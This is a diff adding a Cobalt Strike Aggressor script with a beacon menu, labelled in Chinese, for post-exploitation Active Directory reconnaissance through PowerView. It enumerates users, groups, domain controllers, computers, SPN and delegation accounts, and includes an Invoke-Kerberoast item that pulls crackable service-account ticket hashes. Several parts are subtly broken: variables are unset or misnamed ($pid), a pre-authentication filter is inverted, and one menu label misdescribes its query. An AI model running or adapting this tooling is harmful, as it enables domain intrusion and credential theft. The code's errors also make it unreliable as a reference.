@@ -1,0 +1,141 @@
+sub moduleimport{
+	foreach $bid ($1){
+		blog($bid, "导入脚本: $modulename");
+		bpowershell_import($bid, script_resource($modulename));
+	}
+}
+
+sub getuser{
+	bpowershell($bid, "Get-ADUser -Identity \"$3['username']\"");
+}
+
+sub groupquery{
+	bpowershell($bid, "Get-ADGroupMember \'$3['groupname']\' | Select-Object name,objectClass,distinguishedName,SID | fl");
+}
+
+sub spnuserquery{
+	bpowershell($bid, "Invoke-Kerberoast -Identity \'$3['spnusername']\' | %{\$_.hash}");
+}
+
+popup beacon_bottom{
+	menu "powerview常用查询"{
+		item "导入Powerview"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				blog2($bid, "powerview导入测试");
+				bpowershell($bid, "Get-DomainController");
+			}
+		}
+		item "查看指定的用户信息"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				$dialog = dialog("查看指定用户", %(username => ""), &getuser);
+				dialog_description($dialog, "powerview查看指定用户的信息");
+				drow_text($dialog, "username", "用户: ");
+				dbutton_action($dialog, "QUERY");
+				dialog_show($dialog);
+			}
+		}
+
+		item "所有用户最后一个错误的密码尝试"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "
+get-aduser -filter * -prop lastbadpasswordattempt,badpwdcount | select name,lastbadpasswordattempt,badpwdcount | format-table -auto");
+			}
+		}
+
+
+		item "查询某个组的用户"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				$dialog = dialog("查看指定组的所有用户", %(groupname => ""), &groupquery);
+				dialog_description($dialog, "powerview查看指定组的所有用户");
+				drow_text($dialog, "groupname", "组名: ");
+				dbutton_action($dialog, "QUERY");
+				dialog_show($dialog);
+			}
+
+		}
+
+		item "域控机器查询"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADDomainController -filter * | Select-Object HostName,IPv4Address,OperatingSystem | fl");
+			}
+		}
+
+		item "获取域级别"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADDomain | Select-Object DNSRoot,PDCEmulator,DomainMode");
+			}
+		}
+
+		item "寻找域内所有计算机和计算机对应的DNS"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADComputer -Filter * -Property Name,IPv4Address | Select-Object DNSHostName,IPv4Address,SID | fl");
+			}
+		}
+
+		item "寻找域内所有用户"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADUser -Filter * | Select-Object Name,ObjectClass,SID | fl");
+			}
+		}
+
+		item "寻找kerberos服务用户"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADUser -filter {ServicePrincipalName -like \"*\"} -Property * | Select-Object Name,SID,ServicePrincipalNames | fl");
+			}
+		}
+
+		item "无委派计算机查询"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADComputer -Filter {TrustedForDelegation -eq \$True} -Properties * | select-object DNSHostName,IPv4Address,KerberosEncryptionType,whenCreated | fl");
+			}
+		}
+
+		item "约束委派用户查询"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADUser -Filter {TrustedToAuthForDelegation -eq \$True} -Properties * | select-object DistinguishedName,servicePrincipalName,msDS-AllowedToDelegateTo");
+			}
+		}
+
+		item "域用户不要求kerberos验证身份查询"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($pid, "Get-ADUser -Filter {DoesNotRequirePreAuth -eq \$False} | Select-Object Name,SID | fl");
+			}
+		}
+
+		item "获取指定SPN用户的hash"{
+			$modulename = "Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				$dialog = dialog("获取指定SPN用户的hash", %(spnusername => ""), &spnuserquery);
+				dialog_description($dialog, "powerview获取指定SPN用户的hash");
+				drow_text($dialog, "spnusername", "用户: ");
+				dbutton_action($dialog, "QUERY");
+				dialog_show($dialog);
+			}
+		}
+	}
+}
